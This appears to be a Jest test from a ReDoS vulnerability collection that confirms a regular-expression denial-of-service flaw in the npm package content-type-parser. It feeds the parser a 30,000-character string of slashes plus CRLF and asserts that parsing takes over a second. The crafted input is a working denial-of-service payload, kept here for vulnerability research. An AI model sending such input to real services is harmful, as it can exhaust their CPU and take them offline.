//https://github.com/sola-da/ReDoS-vulnerabilities/blob/master/test-content-type-parser.js
test("ReDos in content-type-parser", () => {

    const genstr = require("./utils").genstr;
    const measureTime = require("./utils").measureTime;
    const contentTypeParser = require("content-type-parser");
    expect({}.polluted).toBe(undefined);
  
    let t = measureTime(function () {
        contentTypeParser(genstr(30000, "/") + "\r\n");
    });
    
    let time= t[0]+t[1]/1000000000;
    
    expect(time).toBeGreaterThan(1);
  });